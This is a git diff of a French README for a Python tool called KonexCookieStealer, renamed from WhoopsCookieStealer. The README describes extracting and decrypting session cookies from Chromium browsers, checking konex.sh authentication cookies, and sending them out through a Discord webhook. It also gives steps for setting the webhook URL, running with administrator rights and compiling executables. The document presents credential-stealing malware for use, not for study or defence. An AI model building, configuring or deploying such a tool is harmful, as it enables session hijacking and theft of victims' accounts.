@@ -1,4 +1,4 @@
-# konex.shCookieStealer
+# KonexCookieStealer
 
 ## Table des matières
 
@@ -18,7 +18,7 @@
 
 ## Description
 
-WhoopsCookieStealer est un script Python qui extrait et vérifie les cookies de session de navigateurs basés sur Chromium. Il cible spécifiquement les cookies d'authentification du site konex.sh et valide leur authenticité avant de les transmettre via un webhook Discord.
+KonexCookieStealer est un script Python qui extrait et vérifie les cookies de session de navigateurs basés sur Chromium. Il cible spécifiquement les cookies d'authentification du site konex.sh et valide leur authenticité avant de les transmettre via un webhook Discord.
 
 L'outil parcourt plusieurs navigateurs installés sur le système, décrypte leurs bases de données de cookies, identifie les sessions valides et envoie les informations récupérées à une URL de webhook configurée.
 
@@ -80,7 +80,7 @@ Les dépendances requises sont :
 
 ## Configuration
 
-Ouvrez le fichier `WhoopsCookieStealer.py` et modifiez la constante `WEBHOOK_URL` avec l'URL de votre webhook Discord :
+Ouvrez le fichier `KonexCookieStealer.py` et modifiez la constante `WEBHOOK_URL` avec l'URL de votre webhook Discord :
 
 ```python
 WEBHOOK_URL = "https://discord.com/api/webhooks/VOTRE_WEBHOOK_URL_ICI"
@@ -99,7 +99,7 @@ Pour créer un webhook Discord :
 1. Lancez le script avec les droits administrateur :
 
 ```bash
-python WhoopsCookieStealer.py
+python KonexCookieStealer.py
 ```
 
 Le script demandera automatiquement l'élévation des privilèges si nécessaire.
@@ -136,9 +136,9 @@ Options de compilation utilisées :
 ## Structure du projet
 
 ```
-WhoopsCookieStealer/
+KonexCookieStealer/
 ├── WhoopsCookieStealer.py    # Script principal
-├── requirements.txt           # Dépendances Python
+├── requirements.txt          # Dépendances Python
 ├── Compile.bat               # Script de compilation
 ├── Quick Setup.bat           # Script d'installation rapide
 └── Compiled/                 # Dossier contenant les exécutables compilés
